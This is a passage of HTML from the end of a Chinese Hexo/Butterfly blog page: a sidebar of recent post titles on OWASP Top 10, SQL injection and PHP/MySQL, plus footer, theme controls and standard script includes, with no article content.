href="/2023/09/19/%E3%80%90%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第一章】常见漏洞OWASP_TOP_10"><img src="https://img1.imgtp.com/2023/09/19/2B8QzN8t.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【第一章】常见漏洞OWASP_TOP_10"/></a><div class="content"><a class="title" href="/2023/09/19/%E3%80%90%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第一章】常见漏洞OWASP_TOP_10">【第一章】常见漏洞OWASP_TOP_10</a><time datetime="2023-09-19T15:43:37.000Z" title="发表于 2023-09-19 23:43:37">2023-09-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/" title="sql注入源代码,测试与分析第一节"><img src="https://img1.imgtp.com/2023/09/16/QdzHyeGb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sql注入源代码,测试与分析第一节"/></a><div class="content"><a class="title" href="/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/" title="sql注入源代码,测试与分析第一节">sql注入源代码,测试与分析第一节</a><time datetime="2023-09-16T06:56:21.000Z" title="发表于 2023-09-16 14:56:21">2023-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/16/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E9%80%9A%E7%AC%94%E8%AE%B0/" title="MySQL数据库速通笔记2"><img src="https://img1.imgtp.com/2023/09/15/pGsccNVu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MySQL数据库速通笔记2"/></a><div class="content"><a class="title" href="/2023/09/16/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E9%80%9F%E9%80%9A%E7%AC%94%E8%AE%B0/" title="MySQL数据库速通笔记2">MySQL数据库速通笔记2</a><time datetime="2023-09-16T06:55:21.000Z" title="发表于 2023-09-16 14:55:21">2023-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/16/%E4%BD%BF%E7%94%A8PHP%E8%BF%9E%E6%8E%A5Mysql/" title="使用PHP连接Mysql"><img src="https://img1.imgtp.com/2023/09/15/pGsccNVu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="使用PHP连接Mysql"/></a><div class="content"><a class="title" href="/2023/09/16/%E4%BD%BF%E7%94%A8PHP%E8%BF%9E%E6%8E%A5Mysql/" title="使用PHP连接Mysql">使用PHP连接Mysql</a><time datetime="2023-09-15T16:11:10.000Z" title="发表于 2023-09-16 00:11:10">2023-09-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Carrot</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io"></a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly"> </a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="ture"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
